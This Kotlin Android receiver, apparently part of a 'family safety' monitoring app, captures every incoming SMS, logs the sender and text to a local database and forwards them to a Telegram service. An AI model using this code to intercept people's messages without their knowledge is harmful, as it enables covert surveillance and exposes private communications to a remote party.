package com.family.safety.helper.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.family.safety.helper.database.MonitoringDatabase
import com.family.safety.helper.database.NotificationEntity
import com.family.safety.helper.services.TelegramService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {
    
    private val scope = CoroutineScope(Dispatchers.IO)
    
    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return
        
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent.action) {
            scope.launch {
                try {
                    val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                    val database = MonitoringDatabase.getDatabase(context)
                    val telegramService = TelegramService()
                    telegramService.initialize(context)
                    
                    messages?.forEach { message ->
                        val sender = message.originatingAddress ?: "Unknown"
                        val messageBody = message.messageBody ?: ""
                        val timestamp = System.currentTimeMillis()
                        
                        // Store in database
                        val notificationEntity = NotificationEntity(
                            packageName = "sms",
                            appName = "SMS",
                            title = "SMS from $sender",
                            text = messageBody,
                            timestamp = timestamp
                        )
                        
                        database.notificationDao().insertNotification(notificationEntity)
                        
                        // Try to send immediately
                        val success = telegramService.sendSmsAlert(
                            sender = sender,
                            message = messageBody,
                            timestamp = timestamp
                        )
                        
                        if (success) {
                            database.notificationDao().markAsSent(notificationEntity.id)
                        }
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }
}
